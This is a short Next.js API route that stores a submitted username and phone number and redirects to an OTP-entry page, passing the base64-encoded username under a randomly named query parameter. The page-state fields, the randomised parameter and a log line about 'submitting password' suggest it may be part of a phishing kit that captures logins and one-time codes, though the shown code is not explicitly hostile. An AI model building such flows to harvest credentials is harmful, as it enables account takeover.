import { NextRequest, NextResponse } from 'next/server';
import { getMainCollection } from '@/lib/database';
import { getClientIP, getUserAgent, encodeBase64, generateRandomParam } from '@/lib/utils';

export const dynamic = 'force-dynamic';

export async function POST(request: NextRequest) {
  try {
    const { username, tel } = await request.json();
    
    if (!username || !tel) {
      return NextResponse.json({ error: 'Missing Mobile number' }, { status: 400 });
    }

    const b64 = encodeBase64(username);
    const pagetype = 0;
    const mobiletype = tel;
    const notify = 0;

    const collection = await getMainCollection();
    const existingUser = await collection.findOne({ username: username });

    if (existingUser) {
      // Update existing user
      await collection.updateOne(
        { username: username },
        { 
          $set: { 
            pagetype: pagetype, 
            mobiletype: mobiletype, 
            notify: notify 
          } 
        }
      );
    }

    // Extract last 4 digits of phone number for display
    const phoneDigits = mobiletype.replace(/\D/g, ''); // Remove non-digits
    const hiddenMobNumber = phoneDigits.slice(-4);
    
    const randomParam = generateRandomParam();
    const redirectUrl = `/enterotp?${randomParam}=${b64}&mob=${hiddenMobNumber}`;
    return NextResponse.json({ success: true, redirectUrl });
  } catch (error) {
    console.error('Error submitting password:', error);
    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
  }
}